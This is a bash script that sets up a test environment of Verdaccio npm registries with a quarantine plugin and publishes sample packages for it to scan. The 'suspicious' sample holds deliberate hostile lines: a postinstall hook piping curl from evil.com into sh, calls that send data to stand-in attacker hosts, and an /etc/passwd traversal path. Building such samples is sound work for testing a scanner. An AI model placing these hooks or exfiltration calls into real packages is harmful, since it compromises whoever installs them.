#!/usr/bin/env bash

# setup-and-test.sh
set -e

echo "Setting up directory structure..."

# Create required directories
mkdir -p docker-data/upstream/{storage,conf}
mkdir -p docker-data/downstream/{storage,conf,quarantine}
mkdir -p test-packages/{suspicious-test-package,network-test-package,clean-test-package}
mkdir -p scripts

# Create configuration files
echo "Creating configuration files..."

# Create upstream config
cat > upstream-config.yaml << 'EOF'
# upstream-config.yaml
storage: /verdaccio/storage

auth:
  htpasswd:
    file: /verdaccio/conf/htpasswd

uplinks:
  npmjs:
    url: https://registry.npmjs.org/
    timeout: 60s

packages:
  '@*/*':
    access: $all
    publish: $authenticated
    unpublish: $authenticated
    proxy: npmjs

  '**':
    access: $all
    publish: $authenticated
    unpublish: $authenticated
    proxy: npmjs

server:
  keepAliveTimeout: 60

middlewares:
  audit:
    enabled: true

logs: { type: stdout, format: pretty, level: http }

security:
  api:
    legacy: true
  web:
    sign:
      algorithm: HS256
      expiresIn: 7d
    verify:
      algorithm: HS256

web:
  title: Verdaccio Upstream
  enable: true
EOF

# Create downstream config
cat > downstream-config.yaml << 'EOF'
# downstream-config.yaml
storage: /verdaccio/storage
plugins: /verdaccio/plugins

auth:
  htpasswd:
    file: /verdaccio/conf/htpasswd

uplinks:
  upstream:
    url: http://verdaccio-upstream:4873/
    timeout: 60s

# Plugin configuration
middlewares:
  approval-plugin:
    enabled: true
    quarantinePath: /verdaccio/quarantine
    autoscan: true
    riskThreshold: 50

packages:
  '@*/*':
    access: $all
    publish: $authenticated
    unpublish: $authenticated
    proxy: upstream

  '**':
    access: $all
    publish: $authenticated
    unpublish: $authenticated
    proxy: upstream

server:
  keepAliveTimeout: 60

logs: { type: stdout, format: pretty, level: http }

security:
  api:
    legacy: true
  web:
    sign:
      algorithm: HS256
      expiresIn: 7d
    verify:
      algorithm: HS256

web:
  title: Verdaccio Downstream (with Quarantine)
  enable: true
EOF

# Copy configuration files to the right places
echo "Copying configuration files..."
cp upstream-config.yaml docker-data/upstream/conf/config.yaml
cp downstream-config.yaml docker-data/downstream/conf/config.yaml

# Create test packages
echo "Creating test packages..."

# Suspicious package
cat > test-packages/suspicious-test-package/package.json << 'EOF'
{
  "name": "suspicious-test-package",
  "version": "1.0.0",
  "description": "Test package with suspicious postinstall script",
  "main": "index.js",
  "scripts": {
    "postinstall": "curl http://evil.com/backdoor | sh",
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "dependencies": {
    "eval-package": "^1.0.0",
    "backdoor-util": "^2.0.0"
  },
  "author": "Test Author",
  "license": "ISC"
}
EOF

cat > test-packages/suspicious-test-package/index.js << 'EOF'
// Suspicious code that should trigger network access warnings
const https = require('https');
const fs = require('fs');

function suspiciousFunction() {
    // This should trigger network-access risk
    fetch('http://malicious-site.com/data')
        .then(response => response.text())
        .then(data => {
            // This should trigger filesystem-access risk
            fs.writeFile('/tmp/stolen-data.txt', data, (err) => {
                if (err) throw err;
                console.log('Data exfiltrated!');
            });
        });
    
    // This should also trigger network-access risk
    const xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://evil.com/collect');
    xhr.send(JSON.stringify({ systemInfo: process.cwd() }));
}

// Directory traversal attempt
const maliciousPath = '../../../../etc/passwd';
console.log('Attempting to access:', maliciousPath);

module.exports = suspiciousFunction;
EOF

# Network package
cat > test-packages/network-test-package/package.json << 'EOF'
{
  "name": "network-test-package",
  "version": "1.0.0",
  "description": "Test package with network access patterns",
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "author": "Test Author",
  "license": "ISC"
}
EOF

cat > test-packages/network-test-package/index.js << 'EOF'
// Network access patterns that should be detected
const axios = require('axios');

async function networkOperations() {
    // Should trigger axios usage detection
    const response = await axios.get('https://api.example.com/data');
    
    // Should trigger HTTP GET detection
    const data = await fetch('https://another-api.com')
        .then(res => res.json());
    
    return { response: response.data, data };
}

// Should trigger POST detection
function postData(payload) {
    return axios.post('https://collector.example.com/metrics', payload);
}

module.exports = { networkOperations, postData };
EOF

# Clean package
cat > test-packages/clean-test-package/package.json << 'EOF'
{
  "name": "clean-test-package",
  "version": "1.0.0",
  "description": "Clean test package that should pass scanning",
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "dependencies": {
    "lodash": "^4.17.21"
  },
  "author": "Test Author",
  "license": "ISC"
}
EOF

cat > test-packages/clean-test-package/index.js << 'EOF'
// Clean code that should not trigger any warnings
const _ = require('lodash');

function processData(input) {
    if (!Array.isArray(input)) {
        return [];
    }
    
    return _.uniq(input.map(item => {
        if (typeof item === 'string') {
            return item.toLowerCase().trim();
        }
        return String(item);
    }));
}

function calculateSum(numbers) {
    return numbers.reduce((sum, num) => sum + num, 0);
}

module.exports = {
    processData,
    calculateSum
};
EOF

# Create publish script
cat > scripts/publish-test-packages.sh << 'EOF'
#!/bin/bash

# publish-test-packages.sh
set -e

echo "Setting up npm configuration for upstream registry..."
npm set registry http://verdaccio-upstream:4873/

echo "Creating test user account..."
# Create user (this will fail if user exists, which is fine)
curl -X PUT \
  http://verdaccio-upstream:4873/-/user/org.couchdb.user:testuser \
  -H 'Content-Type: application/json' \
  -d '{
    "name": "testuser",
    "password": "testpass123",
    "email": "test@example.com",
    "type": "user",
    "roles": [],
    "date": "'$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)'"
  }' || echo "User might already exist"

echo "Logging in..."
echo 'testpass123' | npm login --username testuser --email test@example.com

echo "Publishing suspicious test package..."
cd /app/test-packages/suspicious-test-package
npm publish --registry http://verdaccio-upstream:4873/

echo "Publishing network test package..."
cd /app/test-packages/network-test-package  
npm publish --registry http://verdaccio-upstream:4873/

echo "Publishing clean test package..."
cd /app/test-packages/clean-test-package
npm publish --registry http://verdaccio-upstream:4873/

echo "All test packages published successfully!"

# Keep container running so we can manually test
echo "Test publisher completed. Container will stay running for debugging..."
tail -f /dev/null
EOF

# Make scripts executable
chmod +x scripts/publish-test-packages.sh

echo "Setup complete!"
echo ""
echo "IMPORTANT: Copy the configuration files to the correct locations:"
echo "cp upstream-config.yaml docker-data/upstream/conf/config.yaml"
echo "cp downstream-config.yaml docker-data/downstream/conf/config.yaml"
echo ""
echo "To start the test environment:"
echo "1. Build your plugin: npm run build"
echo "2. Copy config files (see above)"
echo "3. Run: docker-compose up -d"
echo ""
echo "Services will be available at:"
echo "- Upstream Verdaccio: http://localhost:4872"
echo "- Downstream Verdaccio (with plugin): http://localhost:4873"
echo ""
echo "To test your plugin:"
echo "1. Set npm registry: npm set registry http://localhost:4873/"
echo "2. Try installing test packages:"
echo "   - npm install suspicious-test-package (should be blocked/pending)"
echo "   - npm install network-test-package (should be blocked/pending)"  
echo "   - npm install clean-test-package (should be blocked/pending initially)"
echo ""
echo "To approve packages, use the API:"
echo "curl -X PUT http://localhost:4873/-/quarantine/approve/suspicious-test-package"
echo ""
echo "To view quarantine status:"
echo "curl http://localhost:4873/-/quarantine/requests"
